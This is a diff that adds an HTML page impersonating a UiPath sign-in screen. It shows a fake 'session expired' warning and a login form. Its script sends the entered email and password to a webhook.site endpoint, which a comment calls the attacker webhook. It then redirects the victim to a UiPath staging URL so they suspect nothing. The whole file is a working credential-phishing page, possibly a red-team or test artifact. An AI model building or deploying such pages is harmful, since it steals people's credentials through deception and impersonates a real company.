@@ -1,0 +1,149 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in - UiPath</title>
+    <link rel="icon" type="image/x-icon" href="https://staging.uipath.com/cursororg/DefaultTenant/testmanager_/favicon.ico">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: noto-sans, 'Noto Sans', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: #f4f5f7;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .container {
+            background: #fff;
+            border-radius: 8px;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+            padding: 40px;
+            width: 400px;
+            max-width: 90vw;
+        }
+        .logo {
+            text-align: center;
+            margin-bottom: 32px;
+        }
+        .logo svg { width: 120px; }
+        .session-msg {
+            background: #fff0f1;
+            border-left: 4px solid #cc3d45;
+            padding: 12px 16px;
+            border-radius: 0 4px 4px 0;
+            margin-bottom: 24px;
+            font-size: 13px;
+            color: #a6040a;
+            line-height: 1.5;
+        }
+        h2 {
+            font-size: 20px;
+            font-weight: 600;
+            color: #273139;
+            margin-bottom: 24px;
+            text-align: center;
+        }
+        .field {
+            margin-bottom: 16px;
+        }
+        .field label {
+            display: block;
+            font-size: 12px;
+            font-weight: 600;
+            color: #526069;
+            margin-bottom: 6px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+        .field input {
+            width: 100%;
+            padding: 10px 12px;
+            border: 1px solid #a4b1b8;
+            border-radius: 4px;
+            font-size: 14px;
+            font-family: inherit;
+            color: #273139;
+            background: #fff;
+            transition: border-color 0.2s;
+        }
+        .field input:focus {
+            outline: none;
+            border-color: #0067df;
+            box-shadow: 0 0 0 1px #0067df;
+        }
+        .btn {
+            width: 100%;
+            padding: 12px;
+            background: #0067df;
+            color: #fff;
+            border: none;
+            border-radius: 4px;
+            font-size: 14px;
+            font-weight: 600;
+            font-family: inherit;
+            cursor: pointer;
+            margin-top: 8px;
+            transition: background 0.2s;
+        }
+        .btn:hover { background: #0056ba; }
+        .footer {
+            text-align: center;
+            margin-top: 24px;
+            font-size: 12px;
+            color: #8a97a0;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <svg viewBox="0 0 100 30" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <text x="10" y="22" font-family="noto-sans, sans-serif" font-size="20" font-weight="700" fill="#fa4616">UiPath</text>
+            </svg>
+        </div>
+
+        <div class="session-msg">
+            Your session has expired due to inactivity. Please sign in again to continue.
+        </div>
+
+        <h2>Sign in</h2>
+
+        <form id="phish-form">
+            <div class="field">
+                <label>Email</label>
+                <input type="email" id="email" placeholder="name@company.com" autocomplete="email" required>
+            </div>
+            <div class="field">
+                <label>Password</label>
+                <input type="password" id="password" placeholder="Enter your password" required>
+            </div>
+            <button type="submit" class="btn">Sign in</button>
+        </form>
+
+        <div class="footer">
+            &copy; 2026 UiPath. All rights reserved.
+        </div>
+    </div>
+
+    <script>
+        document.getElementById('phish-form').addEventListener('submit', function(e) {
+            e.preventDefault();
+            var email = document.getElementById('email').value;
+            var password = document.getElementById('password').value;
+
+            // Send captured credentials to attacker webhook
+            fetch('https://webhook.site/1745adb6-9637-4bdb-9bf0-1f1c497d81c4/creds', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ email: email, password: password }),
+                mode: 'no-cors'
+            });
+
+            // Redirect back to real UiPath so victim doesn't suspect anything
+            window.location.href = 'https://staging.uipath.com/cursororg/DefaultTenant/testmanager_/123/requirements';
+        });
+    </script>
+</body>
+</html>
